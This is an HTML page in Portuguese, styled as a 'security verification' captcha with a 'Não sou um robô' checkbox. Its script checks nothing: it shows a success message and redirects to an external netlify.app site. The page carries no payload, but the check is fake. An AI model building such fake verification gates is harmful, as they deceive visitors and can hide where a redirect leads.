
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verificação de segurança</title>

<style>
*{
  box-sizing:border-box;
  margin:0;
  padding:0;
}

body{
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
  font-family:Arial,Helvetica,sans-serif;
  background:linear-gradient(135deg,#eef2ff,#f8fafc,#f5f3ff);
  color:#172554;
}

.captcha{
  width:100%;
  max-width:390px;
  background:#fff;
  border-radius:20px;
  padding:28px 22px;
  box-shadow:0 15px 45px rgba(15,23,42,.12);
  text-align:center;
}

.icon{
  width:58px;
  height:58px;
  margin:0 auto 15px;
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius:16px;
  background:linear-gradient(135deg,#4f46e5,#7c3aed);
  color:#fff;
  font-size:28px;
}

h1{
  font-size:21px;
  margin-bottom:7px;
}

.subtitle{
  font-size:13px;
  color:#64748b;
  margin-bottom:22px;
}

.checkbox-box{
  display:flex;
  align-items:center;
  gap:12px;
  padding:17px;
  border:1px solid #dbe2ea;
  border-radius:12px;
  background:#f8fafc;
  text-align:left;
  cursor:pointer;
  transition:.2s;
}

.checkbox-box:hover{
  border-color:#6366f1;
  background:#f5f3ff;
}

.checkbox-box input{
  width:22px;
  height:22px;
  cursor:pointer;
  accent-color:#4f46e5;
  flex-shrink:0;
}

.checkbox-text{
  font-size:15px;
  font-weight:600;
  color:#334155;
}

.verify{
  width:100%;
  margin-top:15px;
  min-height:50px;
  border:0;
  border-radius:12px;
  background:linear-gradient(135deg,#4f46e5,#7c3aed);
  color:#fff;
  font-size:15px;
  font-weight:700;
  cursor:pointer;
  transition:.2s;
}

.verify:disabled{
  opacity:.45;
  cursor:not-allowed;
}

.verify:not(:disabled):active{
  transform:scale(.98);
}

.message{
  display:none;
  margin-top:13px;
  padding:12px;
  border-radius:10px;
  font-size:13px;
}

.success{
  display:block;
  color:#047857;
  background:#ecfdf5;
  border:1px solid #a7f3d0;
}

.footer{
  margin-top:18px;
  font-size:10px;
  color:#94a3b8;
}
</style>
</head>

<body>

<main class="captcha">

  <div class="icon">✓</div>

  <h1>Verificação de segurança</h1>

  <div class="subtitle">
    Confirme que você é uma pessoa
  </div>

  <label class="checkbox-box">
    <input type="checkbox" id="human">
    <span class="checkbox-text">
      Não sou um robô
    </span>
  </label>

  <button
    class="verify"
    id="verify"
    disabled>
    Verificar →
  </button>

  <div
    class="message"
    id="message">
  </div>

  <div class="footer">
    Verificação de segurança • Navegação segura
  </div>

</main>

<script>

const human = document.getElementById("human");
const verify = document.getElementById("verify");
const message = document.getElementById("message");

human.addEventListener("change", function(){

  verify.disabled = !this.checked;

});

verify.addEventListener("click", function(){

  if(!human.checked){
    return;
  }

  message.className = "message success";
  message.textContent = "✓ Verificação concluída! Redirecionando...";

  verify.disabled = true;
  human.disabled = true;

  setTimeout(function(){

    window.location.href =
      "https://zippy-desenrola.netlify.app/";

  },800);

});

</script>

</body>
</html>
